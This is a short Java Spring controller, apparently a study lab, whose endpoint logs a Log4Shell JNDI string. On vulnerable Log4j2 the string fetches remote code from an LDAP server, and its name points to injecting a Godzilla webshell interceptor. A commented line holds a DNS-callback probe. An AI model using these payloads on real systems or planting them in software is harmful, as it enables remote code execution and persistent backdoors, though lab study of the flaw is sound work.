package org.study.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class Log4j2Controller {
    @ResponseBody
    @RequestMapping(value = "/log4j2", method = RequestMethod.GET)
    public String log4j2()  throws Exception {
        final Logger logger = LogManager.getLogger();
        logger.error("${jndi:ldap://127.0.0.1:8888/GodzillaAddInterceptor}");
//        logger.error("${jndi:ldap://9553928d.dns.1433.eu.org}");
        return "Log4j2 TEST";
    }
}
